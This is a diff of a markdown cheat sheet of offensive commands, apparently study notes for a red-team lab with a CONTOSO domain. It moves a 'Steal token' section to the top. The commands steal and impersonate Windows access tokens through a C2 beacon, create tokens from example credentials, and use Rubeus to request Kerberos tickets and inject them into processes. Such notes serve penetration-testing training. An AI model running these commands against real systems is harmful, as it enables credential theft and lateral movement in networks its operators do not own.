@@ -1,4 +1,17 @@
 
+Steal token
+```powershell
+token-store steal 3184
+token-store use 0 
+```
+
+```powershell
+klist
+rev2self
+token-store remove 0
+kill [ppid]
+```
+
 Token Impersonation
 ```powershell
 make_token CONTOSO\rsteel Passw0rd!
@@ -28,17 +41,4 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rste
 Inject ticket into process from high-integrity beacon
 ```powershell
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:rsteel /domain:CONTOSO.COM /password:FakePass /ticket:[TGT]
-```
-
-Steal token
-```powershell
-token-store steal 3184
-token-store use 0 
-```
-
-```powershell
-klist
-rev2self
-token-store remove 0
-kill [ppid]
 ```
